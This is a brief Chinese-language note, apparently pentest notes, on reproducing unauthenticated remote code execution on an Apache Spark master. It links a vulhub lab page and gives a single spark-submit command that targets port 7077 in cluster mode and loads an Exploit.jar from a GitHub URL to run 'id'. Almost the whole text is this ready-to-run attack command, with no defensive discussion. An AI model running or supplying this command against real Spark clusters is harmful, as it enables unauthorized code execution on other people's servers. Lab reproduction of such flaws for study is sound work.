具体漏洞复现可以参考：*https://github.com/vulhub/vulhub/tree/master/spark/unacc#%E5%88%A9%E7%94%A8submissions%E7%BD%91%E5%85%B3*

执行命令进行RCE*：**bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id*
